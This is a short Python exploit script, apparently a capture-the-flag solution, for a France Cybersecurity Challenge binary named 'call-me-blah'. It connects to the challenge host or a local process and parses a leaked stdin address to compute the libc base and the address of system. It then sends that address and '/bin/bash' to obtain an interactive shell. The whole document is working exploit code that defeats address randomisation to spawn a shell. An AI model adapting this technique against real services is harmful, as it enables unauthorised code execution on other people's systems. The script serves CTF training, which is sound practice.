from pwn import *

#context.log_level = 'info'

elf = context.binary = ELF('./call-me-blah')

host, port = "challenges.france-cybersecurity-challenge.fr", "2103"

if args.REMOTE:
  p = remote(host,port)
  libc = ELF("./libc-2.36.so")
  ld = ELF("./ld-2.36.so")
else:
  #libc = elf.libc
  #p = process(elf.path)
  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
  ld = ELF("/lib64/ld-linux-x86-64.so.2")
  p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})

# Récupération adresse en mémoire de stdin
data = p.recvline().decode()
log.info(data)
leak_stdin_address = data.split('x')[1].strip()
print(f'{leak_stdin_address=}')
leak_stdin_address = int(leak_stdin_address, 16)

'''
stdin = libc.sym['stdin']
print(hex(stdin))
stdin_in_got = elf.got['stdin']
print(hex(stdin_in_got))
'''

# Réupération adresse stdin dans la libc
good_stdin = libc.sym['_IO_2_1_stdin_']
print(hex(good_stdin))

# Récupération adresse system dans la libc
system = libc.sym['system']
print(f'{hex(system)=}')

# Prise en comtpe de l'offset chargement de la libc en mémoire
#libc.address = leak_stdin_address - stdin + (0x00000021b870 -0x000000000021aaa0)
libc.address = leak_stdin_address - good_stdin

# Récupération adresse system dans le process (ie en prenant en compte l'adresse où la libc a été chargée)
system = libc.sym['system']
print(f'{hex(system)=}')
print(f'{system=}')

p.sendline(str(system).encode())
p.sendline(b'/bin/bash')
p.interactive()

p.close()
